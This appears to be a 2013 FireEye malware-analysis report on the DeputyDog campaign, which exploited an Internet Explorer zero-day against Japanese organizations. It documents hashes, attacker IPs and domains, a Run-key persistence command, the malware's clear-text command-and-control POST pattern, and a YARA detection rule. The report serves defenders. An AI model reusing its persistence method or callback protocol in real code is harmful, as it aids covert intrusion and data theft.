Operation DeputyDog: Zero-Day (CVE-2013-3893) Attack
Against Japanese Targets

September 21, 2013

FireEye has discovered a campaign leveraging the recently announced zero-day CVE-20133893. This campaign, which we have labeled ‘Operation DeputyDog’, began as early as
August 19, 2013 and appears to have targeted organizations in Japan. FireEye Labs has
been continuously monitoring the activities of the threat actor responsible for this campaign.
Analysis based on our Dynamic Threat Intelligence cluster shows that this current campaign
leveraged command and control infrastructure that is related to the infrastructure used in the
attack on Bit9.
Campaign Details
On September 17, 2013 Microsoft published details regarding a new zero-day exploit in
Internet Explorer that was being used in targeted attacks. FireEye can confirm reports that
these attacks were directed against entities in Japan. Furthermore, FireEye has discovered
that the group responsible for this new operation is the same threat actor that
compromised Bit9 in February 2013.
FireEye detected the payload used in these attacks on August 23, 2013 in Japan. The
payload was hosted on a server in Hong Kong (210.176.3.130) and was named
“img20130823.jpg”. Although it had a .jpg file extension, it was not an image file. The file,
when XORed with 0×95, was an executable (MD5: 8aba4b5184072f2a50cbc5ecfe326701).
Upon execution, 8aba4b5184072f2a50cbc5ecfe326701 writes “28542CC0.dll” (MD5:
46fd936bada07819f61ec3790cb08e19) to this location:
C:\Documents and Settings\All Users\Application Data\28542CC0.dll
In order to maintain persistence, the original malware adds this registry key:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\28542CC0
The registry key has this value:
rundll32.exe “C:\Documents and Settings\All Users\Application Data\28542CC0.dll”,Launch
The malware (8aba4b5184072f2a50cbc5ecfe326701) then connects to a host in South
Korea (180.150.228.102). This callback traffic is HTTP over port 443 (which is typically used
for HTTPS encrypted traffic; however, the traffic is not HTTPS nor SSL encrypted). Instead,

1/4

this clear-text callback traffic resembles this pattern:
POST /info.asp HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Agtid: [8 chars]08x
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: 180.150.228.102:443
Content-Length: 1045
Connection: Keep-Alive
Cache-Control: no-cache
[8 chars]08x&[Base64 Content]
The unique HTTP header “Agtid:” contains 8 characters followed by “08x”. The same pattern
can be seen in the POST content as well.
A second related sample was also delivered from 111.118.21.105/css/sun.css on September
5, 2013. The sun.css file was a malicious executable with an MD5 of
bd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications
protocol described above to the same command and control server at 180.150.228.102.
Related Samples
We found that both droppers, bd07926c72739bb7121cec8a2863ad87 and
8aba4b5184072f2a50cbc5ecfe326701, were compiled on 2013-08-19 at 13:21:59 UTC. As
we examined these files, we noticed a unique fingerprint.
These samples both had a string that may have been an artifact of the builder used to create
the binaries. This string was “DGGYDSYRL”, which we refer to as “DeputyDog”. As such, we
developed the following YARA signature, based on this unique attribute:
rule APT_DeputyDog_Strings
{
meta:
author = “FireEye Labs”
version = “1.0″
description = “detects string seen in samples used in 2013-3893 0day attacks”
reference = “8aba4b5184072f2a50cbc5ecfe326701″
strings:
$mz = {4d 5a}
$a = “DGGYDSYRL”
condition:
($mz at 0) and $a
}

We used this signature to identify 5 other potentially related samples:

Links to Previous Campaigns
According to Bit9, the attackers that penetrated their network dropped two variants of
the HiKit rootkit. One of these Hitkit samples connected to a command and control server
at downloadmp3server[.]servemp3[.]com that resolved to 66.153.86.14. This same IP
address also hosted www[.]yahooeast[.]net, a known malicious domain, between March 6,
2012 and April 22, 2012.
The domain yahooeast[.]net was registered to 654@123.com. This email address was also
used to register blankchair[.]com – the domain that we see was pointed to the
180.150.228.102 IP, which is the callback associated with sample
58dc05118ef8b11dcb5f5c596ab772fd, and has been already correlated back to the attack
leveraging the CVE-2013-3893 zero-day vulnerability.

Conclusion
While these attackers have a demonstrated previously unknown zero-day exploits and a
robust set of malware payloads, using the techniques described above, it is still possible for
network defense professionals to develop a rich set of indicators that can be used to detect
their attacks. This is the first part of our analysis, we will provide more detailed analysis on
the other components of this attack in subsequent blog post.
